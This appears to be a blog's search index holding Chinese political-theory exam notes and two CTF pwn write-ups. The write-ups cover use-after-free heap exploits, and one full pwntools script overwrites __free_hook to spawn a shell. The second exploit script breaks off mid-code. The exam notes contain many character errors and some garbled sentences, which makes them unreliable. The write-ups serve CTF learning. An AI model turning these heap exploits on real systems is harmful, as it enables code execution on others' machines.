<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>毛概</title>
      <link href="/2023/04/15/mao-gai/"/>
      <url>/2023/04/15/mao-gai/</url>
      
        <content type="html"><![CDATA[<h2 id="马克思主义中国化时代化的几大理论成果各自回答了什么问题？"><a href="#马克思主义中国化时代化的几大理论成果各自回答了什么问题？" class="headerlink" title="马克思主义中国化时代化的几大理论成果各自回答了什么问题？"></a>马克思主义中国化时代化的几大理论成果各自回答了什么问题？</h2><p><strong>毛泽东思想：</strong>毛泽东思想紧紧围绕着中国革命和建设这个主题，构成一个完整的科学思想体系，包含新民主主义革命理论、社会主义革命和社会主义建设理论等内容，在实践中解決了中国人民如何站起水的问题；<br><strong>中国特色社会主义理论体系：</strong>包括邓小平理论、“三个代表〞 重要思想以及科学发展观等重大战略思想在内的科学理论体系。习近平新时代中国特色社会主义理论体系是马克思主义中国化最新理论成果。中国特色社会理论解決了中国人民如何富起来和强起来的问题。</p><h2 id="如何理解毛泽东思想的活的灵魂？"><a href="#如何理解毛泽东思想的活的灵魂？" class="headerlink" title="如何理解毛泽东思想的活的灵魂？"></a>如何理解毛泽东思想的活的灵魂？</h2><p>毛泽东思想的活的灵魂，是贯穿于上述各个理论的立场、观点和方法。它们有三个基本方面，即实事求是，群众路线，独立自主。实事求是，就是不断地深化对中国国情的认识，找出适合中国情况的革命和建设道路，确定我们党领导人民改造中国、建设中国的战略策略，实现推动历史前进的目标。群众路线，就是把马克思列宁主义关于人民群众是历史创造者的原理，系统地运用在党的全部活动中，形成的党的根本工作路线。独立自主，就是坚定不移地维护民族独立、捍卫国家主权，把立足点放在依靠自己力量的基础上，同时积极争取外援，开展国际经济文化交流，学习外国一切对我们有益的先进事物。毛泽东把辩证唯物主义和历史唯物主义运用于党的全部工作，在中国革命和建设的长期艰苦奋斗中形成了具有中国共产党人特色的这些立场、观点和方法，丰富和发展了马克思列宁主义。</p><h2 id="如何理解中国新民主主义革命的性质和前途？"><a href="#如何理解中国新民主主义革命的性质和前途？" class="headerlink" title="如何理解中国新民主主义革命的性质和前途？"></a>如何理解中国新民主主义革命的性质和前途？</h2><h3 id="新民主主义革命的性质和前途"><a href="#新民主主义革命的性质和前途" class="headerlink" title="新民主主义革命的性质和前途"></a>新民主主义革命的性质和前途</h3><h4 id="1-新民主主义革命的性质"><a href="#1-新民主主义革命的性质" class="headerlink" title="1.新民主主义革命的性质"></a>1.新民主主义革命的性质</h4><p>近代中国半殖民地半封建社会的性质和中国革命的历史任务，决定了中国革命的性质不是无产阶级社会主义革命，而是资产阶级民主主义革命。因为新民主主义革命的目标是终结半殖民地半封建社会形态。革命的对象主要是帝国主义和封建主义势力，革命的动力还包括资产阶级，所以，中国革命已不是旧式的、一般的资产阶级民主主义的革命，而是新的民主主义革命。</p><h4 id="2-与旧民主主义革命比较-新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在："><a href="#2-与旧民主主义革命比较-新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在：" class="headerlink" title="2.与旧民主主义革命比较 新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在："></a>2.与旧民主主义革命比较 新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在：</h4><ul><li>a.中国革命处于世界无产阶级社会主义革命的时代，是世界无产阶级社会主义革命的一部分。</li><li>b.革命的领导力量是中国无产阶级及其先锋队一一中国共产党。</li><li>c.革命的指导思想是马克思列宁主义。</li><li>d.革命的前途是社会主义而不是资本主义。</li></ul><h4 id="3-与社会主义革命的区别和联系"><a href="#3-与社会主义革命的区别和联系" class="headerlink" title="3.与社会主义革命的区别和联系"></a>3.与社会主义革命的区别和联系</h4><ul><li>a.区别：新民主主义革命与社会主义革命性质不同。新民主主义革命仍然属于资产阶级民主主 义革命的范畴。它要建立的是无产阶级领导的各革命阶级的联合专政，而不是无产阶级专政。社 会主义革命是无产阶级性质的革命，它所要实现的目标是消灭资本主义剥削制度和改造小生产 的私有制。</li><li>b.联系：新民主主义革命与社会主义革命也是互相联系、紧密街接的，中间不容横插一个资产 阶级专政。坚决地领导民主革命，是争取社会主义胜利的条件。民主主义革命是社会主义革命的 必要准备，社会主义革命是民主主义革命的必然趋势。</li></ul><h4 id="4-如何理解新民主主义革命的三大法宝及其相互关系？"><a href="#4-如何理解新民主主义革命的三大法宝及其相互关系？" class="headerlink" title="4.如何理解新民主主义革命的三大法宝及其相互关系？"></a>4.如何理解新民主主义革命的三大法宝及其相互关系？</h4><p>答：统一战线，武装斗争，党的建设，是中国共产觉在中国草命中战胜致人的三个法宝。统一战线和武装斗争是中国革命的两个基本特点，是战胜政人的两个基木武器。统一战线是实行武装斗争的统一战线，武装斗争是统一战线的中心文柱党的建设则是掌握统一战线和武装斗争这两个武器以实行对敌冲锋陷阵的英勇战士。</p><h4 id="5-怎样理解觉在过渡时期的总路线？"><a href="#5-怎样理解觉在过渡时期的总路线？" class="headerlink" title="5.怎样理解觉在过渡时期的总路线？"></a>5.怎样理解觉在过渡时期的总路线？</h4><p>党在过波时期总路线的主要内容是“一化三改”。</p><ul><li>“一化”即国家社会主义工业化</li><li>“三改”即对个体农业、手工业和对资本主义工商业的社会主义改造。</li><li>它们之间相互联系，不可分离，可以比喻为鸟的“主体”和“两翼，</li></ul><h4 id="6-我国社会主义改造的基本经验有哪些？"><a href="#6-我国社会主义改造的基本经验有哪些？" class="headerlink" title="6.我国社会主义改造的基本经验有哪些？"></a>6.我国社会主义改造的基本经验有哪些？</h4><ul><li><p>第一，坚持社会主义工业化建设与社会主义改造同时并举。实现以社会主义工业化为主体，完成对农业、手工业社会主义改造和对资本主义工商业社会主义改造为两翼，是党在过渡时期总路线的明确要求。实践证明，觉坚持社会主义改造与社会主义工业化同时并举的方针，对于在深刻的社会变革中保持社会稳定，逐步改善人民生活，推动社会发展，都具有十分重要的意义。</p></li><li><p>第二，采取积极引导、逐步过渡的方式。我国对农业、手工业和资本主义工商业的改造都采取了区别对象，用不同的办法积极引1导、逐步过渡的方式。中国的这场巨大而深刻的社会变革，不仅没有对生产力的发展造成破坏，而且促进了生产力的发展。</p></li><li><p>第三，进行和平改造。在社会主义改造之前，无论是资本主义工商业，还是农民和手工业者的个体所有制，都具有私有制的性质。在农业社会主义改造方面，用事实向农民表明合作化的好处和给农民带来的利益，使农民拥护党的政策。手工业者的情况和农民基本相同。同时以和平陵买的方法完成了对资木主义工商业的社会主义改造，并把对资本主义企业的改造和对资本家个人的改造结合在一起进行。对资本家实行团结、教育和改造的方针，不仅稳定了资本家的思想，提高了他们的认识，保证了改造的顺利进行，而且将几十万资本家改造成自食其力的劳动者，成为社会主义企业的经营和管理千部。这不仅保证了社会的稳定，而且极大地促进了社会主义事业的发展。</p></li></ul><p>总之，和平改造解快了诸如实现社会变革与经济发展、和平过渡与消灭剥削制度这类通常难以解決的矛盾问题。</p><h4 id="7-党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？"><a href="#7-党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？" class="headerlink" title="7.党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？"></a>7.党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？</h4><p>（1）提出马克思主义和中国实际的 “第二次结合〞，为探索适合中国情況的社会主义建设道路，提供了基本的指导原则。</p><p>（2）提出“向现代科学进军〞的口号，制定了科学技术发展远景规划纲要，开始了向世界科学技术先进水平的进军。</p><p>（3）《论十大关系》的发光，是以毛深东为主要代表的中四共产觉人开始探紫中四自己的社公主义徙设道路的标志，它在新的历史尔什下从经济方面(这是主要的）和政治方面捉出了新的指导方针，为中共八大的召开做了理论准各。又搞资本主义”等。</p><p>（4）明了方向,中共八大后,中国共产党在探索中又提出一些亚要的新恩想，如“可以消次了这本主义，</p><p>（5）《关于正确处理人民内部不盾的问题》 的发表，它创造性地网述了社会主义社会不盾学说，是对科学社会主义理论的重要发展，对中国社会主义事业具有长远的指导意义。</p><p>（6）进行整风和提出建设“六又” 政治局面等思想，是中共八大路线的继续和发展，是觉探索社会主义建设道路的新成果。</p><h4 id="8-如何理解邓小平理论首要的基本的理论问题？"><a href="#8-如何理解邓小平理论首要的基本的理论问题？" class="headerlink" title="8. 如何理解邓小平理论首要的基本的理论问题？"></a>8. 如何理解邓小平理论首要的基本的理论问题？</h4><p>答：邓小平理论首要的基本问题就是什么是社会主义、怎样建设社会主义。社会主义的本质，是解放生产力，发展生产力，消灭剥削，消除两极分化，最终达到共同富裕。关于怎样建设社会主义，双小平指出，要把马克思主义的普遍真理同我国的具体实践结合起来，走自己的路，建设有中国特色的社会主义。</p><h4 id="9-试述社会主义初级阶段的基本路线。"><a href="#9-试述社会主义初级阶段的基本路线。" class="headerlink" title="9.试述社会主义初级阶段的基本路线。"></a>9.试述社会主义初级阶段的基本路线。</h4><p>（1）“建设富强民主义明和谐的社会主义现代化国家”。这是基本路线规定的觉在社会主义初级阶段的奋斗目标。体现了社会主义社会的经济、政治、文化和社会全面发展的要求。</p><p>（2)  “一个中心两个基本点”。这是基本路线最主要的内容是实现社会主义现代化奋斗日标的基本途径。是正确认识和处理经济基础和上层建筑之间、生产力和生产关系之问辦证统一关系的内在要求。</p><p>（3）“领导和國结全国各族人民”。这是实现社会主义现代化奋斗目标的领导力量和依靠力量。</p><p>（4）“自力更生艰苦创业”。这是我们党的优良传统也是实现社会主义初级阶段奋斗目标的根本立足点。</p><h4 id="10-邓小平关于社会主义市场经济理论的主要内涵是什么？"><a href="#10-邓小平关于社会主义市场经济理论的主要内涵是什么？" class="headerlink" title="10.邓小平关于社会主义市场经济理论的主要内涵是什么？"></a>10.邓小平关于社会主义市场经济理论的主要内涵是什么？</h4><p>（1）突破了过去公认的计划经济和市场经济是代表社会主义和资本主义两种经济制度本质属性的观念，认为它们都是经济手段。</p><p>（2）计划与市场作为调节经济的两种手段，它们对经济活动的调节各有自己的优势和长处，还有自身的不足和缺陷，在社会化大生产和存在着复杂经济关系的条件下，市场经济对促进经济发展具有更强的适应性、更显著的优势和较高的效率。但两者都有自身的不足和缺陷，如计划经济不能有效解決效率和激励问题，市场经济的自发性、盲目性会引发恶性竞争、短期行为、道德缺失等。</p><p>（3） 市场经济作为资源配置的一种方式本身不具有制度属性，但是，它与社会主义相结合而形成的经济体制则必须体现社会主义基本制度的特征。把发展市场经济与坚持社会主义基本制度有机结合起来，既可以充分发挥社会主义制度的优越性，又可以充分利用市场经济对发展生产力的作用。</p><h4 id="11-怎样准确把握“三个代表，重要思想的核心观点？"><a href="#11-怎样准确把握“三个代表，重要思想的核心观点？" class="headerlink" title="11.怎样准确把握“三个代表，重要思想的核心观点？"></a>11.怎样准确把握“三个代表，重要思想的核心观点？</h4><p>关健在坚持与时俱进，校心在坚持党的先进性，本质在坚持执政为民，这“三向话”是“三个代天”科学内酒的精神实历，足贸彻落实…三个代表，重要思想的根木要求，也是继“七一，讲话之后对“三个代表”亚要思想的新概括、新河发。我们要联系实际全面理解、正确把握这“三向话”，真正做到在理论上十分清醒，在政治上十分坚定，在行动上十分自觉。</p><h4 id="12-简述科学发展观的科学内涵和精神实质"><a href="#12-简述科学发展观的科学内涵和精神实质" class="headerlink" title="12.简述科学发展观的科学内涵和精神实质"></a>12.简述科学发展观的科学内涵和精神实质</h4><ul><li><p>第一，坚持以人为本。坚持以人为本，就是要以实现人的全面发展为目标，从人民群众的根本利益出发谋发展、促发展，不断满足人民群众日益增长的物质文化需要，切实保障人民群众的经济、政治、文化权益，让发展惠及全体人民。</p></li><li><p>第二，坚持全面发展。就是要以经济建设为中心，全面推进经济建设、政治建设、文化建设和社会建设，实现经济发展和社会全面进步。</p></li><li><p>第三，坚持协调发展。就是要统筹城乡、统筹区域、统筹经济社会发展、统筹人与白然和谐发展、统等国内发展和对外开放，推进生产力和生产关系、经济基础和上层建筑相协调，推进经济建设、政治建设、文化建设、社会建设各个环节、各个方面相协调。</p></li><li><p>第四，坚持协调可持续发展。就是要促进人与自然的和谐，实现经济发展与人口、资源、环境相协调，坚持走生产发展、生活富裕、生态良好的文明发展道路，保证一代又一代永续发展。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWNHUB sh_v1_1</title>
      <link href="/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/"/>
      <url>/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>rm 释放堆之后未清零造成 UAF 漏洞</li><li>ln 执行时仅判断第一个文件是否存在而不会判断第二个文件是否存在，且连接成功后不存在的文件将被添加到文件列表</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li><p>利用两个相同大小的unsorted bin合并，申请一个相同大小的堆块，堆快中残留的fd，可以泄露到 malloc_hook地址进而泄露libc基址</p></li><li><p>删除一个堆之后与另一个堆进行连接</p></li><li><p>再次删除这个堆，即间接的删除了与其进行连接的堆，而不会造成与其连接的堆从文件列表消失</p></li><li><p>再次连接后删除的文件又在文件列表中出现，此时两个文件即两个堆都已经被释放，且最开始被连接的堆的fd为其之后连接的堆</p></li><li><p>用gedit编辑最开始被释放的堆，即可修改其fd，再次申请就可以实现任意地址写</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./sh_v1.1'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.89.206'</span><span class="token punctuation">,</span><span class="token number">34883</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'touch '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'rm '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cp</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cp '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cat '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gedit</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'gedit '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ln</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'ln '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1  <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    rm<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span>cat<span class="token punctuation">(</span><span class="token string">'try7.txt'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1104</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseli<span class="token punctuation">(</span><span class="token string">'free_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basetouch<span class="token punctuation">(</span><span class="token string">'try8.txt'</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try11.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> UAF </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF例题分析</title>
      <link href="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/"/>
      <url>/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="IDA分析程序"><a href="#IDA分析程序" class="headerlink" title="IDA分析程序"></a>IDA分析程序</h3><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/1.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/2.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/3.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/4.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/5.png" class><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>delete函数中<code>free((void *)heap_ptr[v1]);</code>释放堆之后未将heap_ptr[v1]清零，导致了UAF漏洞</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>利用<code>unsorted bin</code>和<code>main arean </code>连接的特点和UAF漏洞泄露libc地址</li><li>利用UAF漏洞将<code>__malloc_hook</code>改写为ogg</li><li>利用double free的错误触发<code>__malloc_hook</code>执行ogg</li></ul><h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.<code>unsorted bin</code>中两个相邻的空闲堆会合并，所以要先创建两个堆即index为0的堆和index为1的堆，且index为0的堆大小属于unsorted bin</p><p>2.用delete释放index为0的堆，此时heap_ptr[0]仍然指向index为0的堆的地址，再用show输出堆的内容，此时堆已经被释放，所以输出的是该堆的fd</p><p>3.接收输出的地址，该地址在<code>main_arena+88</code>的地方，而<code>__malloc_hook</code>在<code>main_arena</code>向上0x10的地址，因此<code>__malloc_hook</code>地址为接收到的地址-88-0x10</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/6.png" class><p>4.计算libc基址以及利用one_gadget工具得到gadget</p><p>5.<code>unsorted bin</code>中存在堆则申请堆块会从<code>unsorted bin</code>中切割而不会用<code>fast bin</code>中的堆，因此需要再创建一个堆将<code>unsorted bin</code>中的堆抵消</p><p>6.释放大小属于fast bin的堆，再去edit堆的内容，此时修改的是fd，由于fast bin是依靠fd连接的，第二次申请的与释放掉的堆相同大小的堆地址就在被修改的fd的地址，edit第二个堆改写成ogg即可实现任意地址写，但是glibc 2.23中存在一项检测机制</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/7.png" class><p>该机制会判断申请的堆的大小和得到的堆的size位的大小是否同属于一个bin链表中，因此需要寻找一个符合条件的地址作为堆的地址，利用<code>find_fake_fast</code>寻找地址并计算到<code>__malloc_hook</code>的距离</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/8.png" class><p>该chunk的size位大小为0x7f，因此要创建0x60~0x6E大小的堆，将fd改成<code>__malloc_hook </code>-相对距离，即可申请到这个地址并且不报错，由于user data在堆起始地址下0x10，所以要先填充0x13的垃圾数据加上ogg</p><p>7.将同一个堆连续delete两次即可触发ogg</p><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>menu <span class="token operator">=</span> <span class="token string">'choice >> '</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token 